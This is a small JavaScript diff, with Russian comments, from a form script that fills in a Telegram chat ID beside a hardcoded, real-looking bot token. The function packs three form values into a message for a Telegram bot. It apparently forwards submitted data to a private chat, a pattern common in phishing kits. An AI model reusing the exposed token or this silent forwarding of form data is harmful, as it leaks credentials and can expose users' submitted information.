@@ -17,7 +17,7 @@ function submitData() {
 function sendToTelegramBot(c1, c2, c3) {
     // Ваш токен и chat_id
     const botToken = "8110531095:AAH0nakl2X7w-Ad4Wcik6W_yGR1klOaASQE";
-    const chatId = "ВАШ_CHAT_ID"; // Замените на ваш chat_id
+    const chatId = "5311186042"; // Замените на ваш chat_id
 
     // Формируем сообщение
     const message = `Данные: ${c1}|${c2}|${c3}`;
